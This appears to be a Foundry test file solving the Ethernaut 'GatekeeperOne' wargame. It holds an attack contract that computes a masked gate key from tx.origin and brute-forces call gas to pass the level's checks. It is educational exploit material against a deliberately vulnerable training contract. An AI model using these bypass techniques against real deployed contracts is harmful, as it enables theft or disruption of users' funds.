// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/GatekeeperOne/GatekeeperOne.sol";
import "../src/GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperOneTest is Test {
    Ethernaut private _ethernaut;
    GatekeeperOneFactory private _gatekeeperOneFactory;
    GatekeeperOne private _gatekeeperOne;

    address private _hacker =
        address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_gatekeeperOneFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(
            _gatekeeperOneFactory
        );
        _gatekeeperOne = GatekeeperOne(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_gatekeeperOne))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _gatekeeperOneFactory = new GatekeeperOneFactory();
    }

    function testGatekeeperOneHack() public testWrapper {
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(
            address(_gatekeeperOne)
        );
        gatekeeperOneHack.attack();
    }
}

contract GatekeeperOneHack {
    address public challengeAddress;

    constructor(address _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function attack() public {
        // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        // require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        // tx.origin = 0x660d2AB91a50Db333aFd7ff14784C75d57FF527f
        // uint160(tx.origin)=0x660d2AB91a50Db333aFd7ff14784C75d57FF527f
        // uint16(uint160(tx.origin))=0x527f
        // uint32(uint64(gateKey))=0x0000 527f
        // uint64(gateKey) = 0x.... .... 0000 527f
        // uint16(uint64(gateKey))=0x527f
        address hackAddr = address(tx.origin);

        bytes8 gateKey = bytes8(uint64(uint160(hackAddr)) & 0xffffffff0000ffff);
        for (uint i = 0; i < 8193; ++i) {
            (bool success, ) = challengeAddress.call{gas: 8191 * 3 + i}(
            /*i + 150 + 8191 * 3*/
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
